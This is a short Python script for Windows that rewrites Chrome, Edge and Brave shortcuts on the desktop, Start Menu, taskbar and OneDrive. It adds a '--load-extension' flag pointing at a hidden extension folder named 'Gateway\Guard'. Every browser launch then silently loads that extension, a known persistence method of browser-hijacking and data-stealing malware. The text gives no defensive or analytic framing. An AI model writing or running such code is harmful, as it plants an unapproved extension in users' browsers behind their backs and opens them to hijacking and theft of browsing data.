import os
import sys

try:
    import win32com.client
    wsh = win32com.client.Dispatch('WScript.Shell')
except Exception:
    import subprocess
    sys.exit(0)

ext_path = os.path.expandvars(r'%LOCALAPPDATA%\Gateway\Guard\guard_extension')
arg = f'--load-extension="{ext_path}"'

dirs = [
    os.path.expandvars(r'%USERPROFILE%\Desktop'),
    os.path.expandvars(r'%PUBLIC%\Desktop'),
    os.path.expandvars(r'%APPDATA%\Microsoft\Windows\Start Menu\Programs'),
    os.path.expandvars(r'%APPDATA%\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar'),
]

one_drive = os.path.expandvars(r'%USERPROFILE%\OneDrive')
if os.path.isdir(one_drive):
    dirs.append(one_drive)


for d in dirs:
    if not os.path.exists(d):
        continue
    for root, _, files in os.walk(d):
        for f in files:
            fl = f.lower()
            if fl.endswith('.lnk') and ('chrome' in fl or 'edge' in fl or 'brave' in fl):
                p = os.path.join(root, f)
                try:
                    sc = wsh.CreateShortcut(p)
                    tgt = (sc.TargetPath or '').lower()
                    if 'chrome.exe' in tgt or 'msedge.exe' in tgt or 'brave.exe' in tgt:
                        if '--load-extension' not in sc.Arguments:
                            sc.Arguments = (sc.Arguments + ' ' + arg).strip()
                            sc.Save()
                            print('[UPDATED]', p)
                        else:
                            print('[ALREADY]', p)
                except Exception as e:
                    print('[SKIP]', p, e)
